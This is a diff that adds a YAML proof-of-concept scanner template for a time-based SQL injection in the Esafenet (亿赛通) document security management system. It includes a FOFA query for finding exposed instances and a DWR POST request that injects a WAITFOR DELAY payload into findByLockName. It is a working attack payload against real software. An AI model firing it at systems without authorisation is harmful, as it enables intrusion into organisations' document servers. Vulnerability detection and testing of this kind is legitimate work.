@@ -1,0 +1,39 @@
+id: poc-yaml-esafenet-jlockseniordao-findbylockname-dwr-sqli
+info:
+  name: 亿赛通电子文档安全管理系统 jlockseniordao.findbylockname.dwr SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 亿赛通电子文档安全管理系统
+  fofa: app="亿赛通-电子文档安全管理系统"
+variables:
+  t1: random_int(4,9)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(body,"CDGServer3")
+- method: POST
+  path: /CDGServer3/dwr/call/plaincall/JLockSeniorDao.findByLockName.dwr
+  headers:
+    Content-Type: text/plain
+  data: 'callCount=1
+
+    page=/CDGServer3/dwr/test/JLockDao
+
+    httpSessionId=
+
+    scriptSessionId=
+
+    c0-scriptName=JLockSeniorDao
+
+    c0-methodName=findByLockName
+
+    c0-id=0
+
+    c0-param0=string:defaultKey1'';WAITFOR DELAY ''0:0:{{.t1}}''--
+
+    batchId=0'
+  expression: status_code == 200 && contains(body,"allowScriptTagRemoting is false")
+    && duration > t1 && duration < t2
+transport: http
